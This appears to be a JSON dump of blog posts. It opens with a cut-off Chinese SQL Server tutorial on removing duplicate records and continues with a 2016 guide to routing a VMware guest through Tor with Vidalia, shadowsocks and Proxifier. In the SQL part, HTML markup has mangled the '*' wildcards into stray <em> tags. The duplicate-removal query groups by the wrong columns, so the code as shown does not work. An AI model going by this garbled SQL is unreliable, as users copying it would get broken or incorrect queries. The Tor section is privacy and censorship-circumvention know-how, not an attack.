face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">delete</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;表名&nbsp;</span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;主字段&nbsp;</span><span style=\"color: #808080\">=</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@id</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">fetch</span><span style=\"color: #000000\">&nbsp;cur_rows&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@id</span><span style=\"color: #000000\">,</span><span style=\"color: #008000\">@max</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"color: #0000ff\"><font face=\"Courier New\">end</font></span><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"color: #0000ff\"><font face=\"Courier New\">close</font></span><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;cur_rows<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">set</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">rowcount</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">0</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">方法二<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">　　有两个意义上的重复记录，一是完全重复的记录，也即所有字段均重复的记录，二是部分关键字段重复的记录，比如Name字段重复，而其他字段不一定重复或都重复可以忽略。<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"font-weight: bold; color: #800000\"><font face=\"Courier New\">1</font></span><font face=\"Courier New\"><span style=\"color: #000000\">、对于第一种重复，比较容易解决，使用<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">distinct</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\"></em></span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tableName<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">就可以得到无重复记录的结果集。<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">如果该表需要删除重复的记录（重复记录保留1条），可以按以下方法删除<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">distinct</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\"><em></span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;#Tmp&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tableName<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">drop</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">table</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tableName<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\"></em></span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;tableName&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;#Tmp<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">drop</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">table</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;#Tmp<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">发生这种重复的原因是表设计不周产生的，增加唯一索引列即可解决。<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">2</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、这类重复问题通常要求保留重复记录中的第一条记录，操作方法如下<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">假设有重复的字段为Name,Address，要求得到这两个字段唯一的结果集<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">identity</span><span style=\"color: #000000\">(</span><span style=\"font-weight: bold; color: #000000\">int</span><span style=\"color: #000000\">,</span><span style=\"font-weight: bold; color: #800000\">1</span><span style=\"color: #000000\">,</span><span style=\"font-weight: bold; color: #800000\">1</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #0000ff\">as</span><span style=\"color: #000000\">&nbsp;autoID,&nbsp;</span><span style=\"color: #808080\"><em></span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;#Tmp&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tableName<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">min</span><span style=\"color: #000000\">(autoID)&nbsp;</span><span style=\"color: #0000ff\">as</span><span style=\"color: #000000\">&nbsp;autoID&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;#Tmp2&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;#Tmp&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;Name,autoID<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\"></em></span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;#Tmp&nbsp;</span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;autoID&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;autoID&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;#tmp2)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">最后一个select即得到了Name，Address不重复的结果集（但多了一个autoID字段，实际写时可以写在select子句中省去此列）<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">(四)</span></font></div><br><div><font face=\"Courier New\"><span style=\"color: #000000\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">查询重复<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;tablename&nbsp;</span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;id&nbsp;</span><span style=\"color: #808080\">in</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;(<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;id&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tablename&nbsp;<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;id&nbsp;<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(id)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">)</font></span></div><br></div>"},{"title":"Tor安全上网指南","id":"4","updated":"2016-08-05T20:13:45.000Z","date":"2016-07-28T15:01:47.000Z","_content":"\n\n本文主要介绍了如何将一个虚拟机系统全局使用TOR技术，笔者所用操作系统为OS X EI Capitan 10.11.5，虚拟机系统为VMware Fusion专业版 8.1.1 (3771013)。\n<!-- more --> \n声明！\n\n==本文原创，技术无罪，笔者即将身处海外，本文撰写目的**仅为防止美国棱镜计划侵犯本人隐私安全，无其它任何用途**。==\n\n==使用TOR技术请在遵守当地法律的前提下使用！本软件在中国大陆地区已被封锁，按照相关法律法规，禁止使用本软件。由于相关政策法律原因，**不允许任何形式私自转载**，本文只进行对TOR相关**技术探讨**，不涉及任何违法违规行为，请勿用于非法用途（如渗透服务器、非法扫描网段、不受监控的网络言论、不受监控的非法互联网通讯等），如出现上述等违法行为，请自负法律责任！==\n\n\n**准备条件**\n\n* 1.一个隧道(ssh,shadowsocks,socket5,http,vpn都可以)可以连接到真正的互联网，如果身处海外请无视此条。\n\n* 2.最新版Vidalia [下载地址](https://dist.torproject.org/vidalia-bundles/)（需完整互联网）\n\n* 3.Vmware Fusion/Vmware workstation/Oracle VirtualBox\n\n* 4.一个完整版的虚拟机操作系统\n\n**笔者环境**\n\n操作系统：OS X EI Capitan 10.11.5\n\n虚拟机软件：VMware Fusion专业版 8.1.1 (3771013)\n\n虚拟机操作系统：Windows xp sp2 或 Kali linux\n\n隧道软件：lantern 或 shadowsockets\n\n### Vidalia部分\n\n*如果你的网络未进行封锁，请忽略前2步，请跑步进入第3步。*\n<img src=\"/content/images/2016/07/1-1.png\" width = \"500px\"/>\n**1.建立您的隧道网络**\n\n笔者以shadowsocks为例，开启shadowsocks配置好信息后，无需做任何操作。shadowsocks的默认对外端口为1080。\n\n**2.在Vidalia中设置代理连接**\n\n打开Vidalia-设置-网络：我使用代理服务器连接网络\n\n地址：127.0.0.1 端口：1080（用户定义）\n\n类型：SOCKS 5\n![](/content/images/2016/07/1-2.png)\n\n**3.继续设置，转发出外网端口**\n\nVidalia-设置-高级-编辑当前torrc：\n![](/content/images/2016/07/1-3.png)\n确认socksport为9050，也可以定义为其他端口。\n同时添加`SocksListenAddress 0.0.0.0:9050`到底部\n保存\n\n笔者配置文件如下，仅供参考，不可复制：\n\n```Bash\n# This file was generated by Tor; if you edit it, comments will not be preserved\n# The old torrc file was renamed to torrc.orig.1 or similar, and Tor will ignore it\n\nControlPort 9051\nDataDirectory /Users/ivan/.tor\nDirReqStatistics 0\nHashedControlPassword 16:此处隐藏\nSocks5Proxy 127.0.0.1:1080\nLog notice stdout\nSocksListenAddress 0.0.0.0:9050\nSocksPort 9050\n```\n\n\n</pre>\n![](/content/images/2016/07/1-4.png)\n**4.Vidalia启动TOR**\n\n稍等片刻，需要建立Tor回路，五分钟后，便会提示你连接成功。\n![](/content/images/2016/07/1-5.png)\n随后可以通过使用Chrome的网络代理插件测试，通过ip测试可判断是否成功。如果ip地址每几分钟自动更新一次，且都是不同国家的，则说明TOR回路建立成功。\n![](/content/images/2016/07/2-2.png)\n![](/content/images/2016/07/2-1.png)\n\n### Vmware部分\n\n**1.设置Vmware，添加虚拟网卡**\n\n进入Vmware的偏好设置-网络，先点小锁，把功能解锁。\n\n然后点+，新建一个网络，**警告：请勿勾选NAT**。\n\n**勾选 将MAC主机连入该网络**\n\n同时设置 **通过DHCP在该网络提供网络地址**：\n\n<pre>\n子网ip：172.16.225.0\n\n子网掩码：255.255.255.0\n</pre>\n\n![](/content/images/2016/07/1.jpg)\n**2.在虚拟机系统的配置中，将网络适配器的上网方式改为vmnet2**\n\n虚拟机-设置-网络适配器-vmnet2，请再次确保无其他上网方式以保证绝对安全。\n![](/content/images/2016/07/2.jpg)\n\n### **虚拟机部分(Win)**\n**1.进入操作系统**\n\n建议重新安装操作系统，以保证系统纯净性。\n![](/content/images/2016/07/4-1.jpg)\n![](/content/images/2016/07/5-pic_hd.jpg)\n\n**2.寻找宿主机ip**\n\n经过笔者的简单测试，宿主机ip为172.16.225.1\n![](/content/images/2016/07/6-pic_hd.jpg)\n如果实在找不到，可用啊D工具箱或nmap等工具进行查找。\n\n**3.确认系统当前状态下不能上网，甚至局域网也不可通，检查网络连接中的网络适配器，禁用一切，仅保留本地连接**\n\n**4.安装Proxifier**\n\nProxifier是一个全局代理软件，将socket端口流量转发到系统全局，十分好用稳定，值得推荐。\n\n**5.配置Proxifer**\n\n打开Proxifier-Profile-Proxy Servers，点击Add...\n![](/content/images/2016/07/7-pic_hd.jpg)\n\n随后保存并设置而为默认\n\n**6.测试网络**\n\n打开浏览器，对当前ip进行查询，ip会随着时间随机切换，不同国家。\n![](/content/images/2016/07/9-pic_hd.jpg)\n![](/content/images/2016/07/8-pic_hd.jpg)\n\n### **总结**\n\n为了保证用户隐私的绝对安全，建议做到以下几点：\n\n* 在虚拟机系统下不要留下任何痕迹：\n * 虚拟机操作系统系统语言设置为英语，地区为美国。\n * 虚拟机下的浏览器建议使用friefox或chrome，安装https everywhere、noscript等插件，在浏览器相关设置中设置禁止追踪等查看隐私行为。\n * 关机前清除系统隐私记录，养成良好习惯。\n * 能设置不保留记录的软件均设置如此。\n * 不要安装使用任何国产软件，尤其是任何国产音乐播放器、任何国产视频播放器，严禁使用360等任何管家、QQ、搜狗输入法、各种国产云盘，否则一定会前功尽弃。\n * 不要使用任何私人账户登录任何网站、任何软件，如有必要，建议现场注册新号码，不要自作聪明使用尘封已久的小号。\n* 将虚拟机操作系统放在Truecrypt等加密软件的虚拟磁盘里，如果是Windows，建议开启Bitlocker，如果是MacOS，建议开启FileVault，同时将系统密码设置为与自己隐私无关的高强度密码。\n* 设置宿主机的BIOS密码，防止设备被盗隐私丢失，同时建议写好一键远程删除虚拟磁盘的sh脚本，以防重要文件泄露。\n* 进入TOR网络后，您将面临更大的网络威胁，因为TOR的网域中深藏全球各地的极客、大黑客、恐怖分子等危险人物，请更加注意保护虚拟机子系统安全以及文件安全。\n\n**特别鸣谢**\n\n感谢几年前@safe121提供的无私技术帮助\n\n","source":"_posts/Tor安全上网指南.md","raw":"---\ntitle: Tor安全上网指南\ntags: 'Hack'\npermalink: tor\nid: 4\nupdated: '2016-08-05 21:13:45'\ndate: 2016-07-28 16:01:47\n---\n\n\n本文主要介绍了如何将一个虚拟机系统全局使用TOR技术，笔者所用操作系统为OS X EI Capitan 10.11.5，虚拟机系统为VMware Fusion专业版 8.1.1 (3771013)。\n<!-- more --> \n声明！\n\n==本文原创，技术无罪，笔者即将身处海外，本文撰写目的**仅为防止美国棱镜计划侵犯本人隐私安全，无其它任何用途**。==\n\n==使用TOR技术请在遵守当地法律的前提下使用！本软件在中国大陆地区已被封锁，按照相关法律法规，禁止使用本软件。由于相关政策法律原因，**不允许任何形式私自转载**，本文只进行对TOR相关**技术探讨**，不涉及任何违法违规行为，请勿用于非法用途（如渗透服务器、非法扫描网段、不受监控的网络言论、不受监控的非法互联网通讯等），如出现上述等违法行为，请自负法律责任！==\n\n\n**准备条件**\n\n* 1.一个隧道(ssh,shadowsocks,socket5,http,vpn都可以)可以连接到真正的互联网，如果身处海外请无视此条。\n\n* 2.最新版Vidalia [下载地址](https://dist.torproject.org/vidalia-bundles/)（需完整互联网）\n\n* 3.Vmware Fusion/Vmware workstation/Oracle VirtualBox\n\n* 4.一个完整版的虚拟机操作系统\n\n**笔者环境**\n\n操作系统：OS X EI Capitan 10.11.5\n\n虚拟机软件：VMware Fusion专业版 8.1.1 (3771013)\n\n虚拟机操作系统：Windows xp sp2 或 Kali linux\n\n隧道软件：lantern 或 shadowsockets\n\n### Vidalia部分\n\n*如果你的网络未进行封锁，请忽略前2步，请跑步进入第3步。*\n<img src=\"/content/images/2016/07/1-1.png\" width = \"500px\"/>\n**1.建立您的隧道网络**\n\n笔者以shadowsocks为例，开启shadowsocks配置好信息后，无需做任何操作。shadowsocks的默认对外端口为1080。\n\n**2.在Vidalia中设置代理连接**\n\n打开Vidalia-设置-网络：我使用代理服务器连接网络\n\n地址：127.0.0.1 端口：1080（用户定义）\n\n类型：SOCKS 5\n![](/content/images/2016/07/1-2.png)\n\n**3.继续设置，转发出外网端口**\n\nVidalia-设置-高级-编辑当前torrc：\n![](/content/images/2016/07/1-3.png)\n确认socksport为9050，也可以定义为其他端口。\n同时添加`SocksListenAddress 0.0.0.0:9050`到底部\n保存\n\n笔者配置文件如下，仅供参考，不可复制：\n\n```Bash\n# This file was generated by Tor; if you edit it, comments will not be preserved\n# The old torrc file was renamed to torrc.orig.1 or similar, and Tor will ignore it\n\nControlPort 9051\nDataDirectory /Users/ivan/.tor\nDirReqStatistics 0\nHashedControlPassword 16:此处隐藏\nSocks5Proxy 127.0.0.1:1080\nLog notice stdout\nSocksListenAddress 0.0.0.0:9050\nSocksPort 9050\n```\n\n\n</pre>\n![](/content/images/2016/07/1-4.png)\n**4.Vidalia启动TOR**\n\n稍等片刻，需要建立Tor回路，五分钟后，便会提示你连接成功。\n![](/content/images/2016/07/1-5.png)\n随后可以通过使用Chrome的网络代理插件测试，通过ip测试可判断是否成功。如果ip地址每几分钟自动更新一次，且都是不同国家的，则说明TOR回路建立成功。\n![](/content/images/2016/07/2-2.png)\n![](/content/images/2016/07/2-1.png)\n\n### Vmware部分\n\n**1.设置Vmware，添加虚拟网卡**\n\n进入Vmware的偏好设置-网络，先点小锁，把功能解锁。\n\n然后点+，新建一个网络，**警告：请勿勾选NAT**。\n\n**勾选 将MAC主机连入该网络**\n\n同时设置 **通过DHCP在该网络提供网络地址**：\n\n<pre>\n子网ip：172.16.225.0\n\n子网掩码：255.255.255.0\n</pre>\n\n![](/content/images/2016/07/1.jpg)\n**2.在虚拟机系统的配置中，将网络适配器的上网方式改为vmnet2**\n\n虚拟机-设置-网络适配器-vmnet2，请再次确保无其他上网方式以保证绝对安全。\n![](/content/images/2016/07/2.jpg)\n\n### **虚拟机部分(Win)**\n**1.进入操作系统**\n\n建议重新安装操作系统，以保证系统纯净性。\n![](/content/images/2016/07/4-1.jpg)\n![](/content/images/2016/07/5-pic_hd.jpg)\n\n**2.寻找宿主机ip**\n\n经过笔者的简单测试，宿主机ip为172.16.225.1\n![](/content/images/2016/07/6-pic_hd.jpg)\n如果实在找不到，可用啊D工具箱或nmap等工具进行查找。\n\n**3.确认系统当前状态下不能上网，甚至局域网也不可通，检查网络连接中的网络适配器，禁用一切，仅保留本地连接**\n\n**4.安装Proxifier**\n\nProxifier是一个全局代理软件，将socket端口流量转发到系统全局，十分好用稳定，值得推荐。\n\n**5.配置Proxifer**\n\n打开Proxifier-Profile-Proxy 